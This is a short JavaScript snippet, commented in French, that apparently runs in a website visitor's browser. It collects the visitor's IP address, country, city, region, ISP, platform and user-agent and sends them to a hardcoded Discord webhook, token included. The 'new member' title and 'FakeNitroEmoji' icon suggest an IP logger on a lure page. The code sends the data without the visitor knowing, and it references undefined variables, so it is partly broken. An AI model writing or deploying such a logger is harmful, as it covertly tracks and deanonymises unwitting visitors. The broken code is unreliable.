const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
const sendWebhookOnce = async () => {
    // Vérifie si le message a déjà été envoyé en utilisant le stockage local
    if (!localStorage.getItem("webhookSent")) {
        const ipAddress = await getIpAddress();
        const country = await getCountryFromIp(ipAddress);

        // Ajoute ces lignes pour obtenir la ville, la région et le fournisseur d'accès Internet
        const city = data.city;
        const region = data.region;
        const isp = data.isp;

        const embed = {
            title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
            description: `**Un nouveau membre a rejoint le site!\nAdresse IP: || ${ipAddress} ||\nPays: || ${country} ||\nVille: || ${city} ||\nRégion: || ${region} ||\nFournisseur d'accès Internet: || ${isp} ||\nPlateforme: || ${platform} ||\nUser-Agent: || ${userAgent} ||**`,
            color: 0x00ff00
        };

        const payload = {
            embeds: [embed]
        };

        // Envoie du message via le webhook Discord
        fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        // Marque le message comme déjà envoyé
        localStorage.setItem("webhookSent", "true");
    }
};
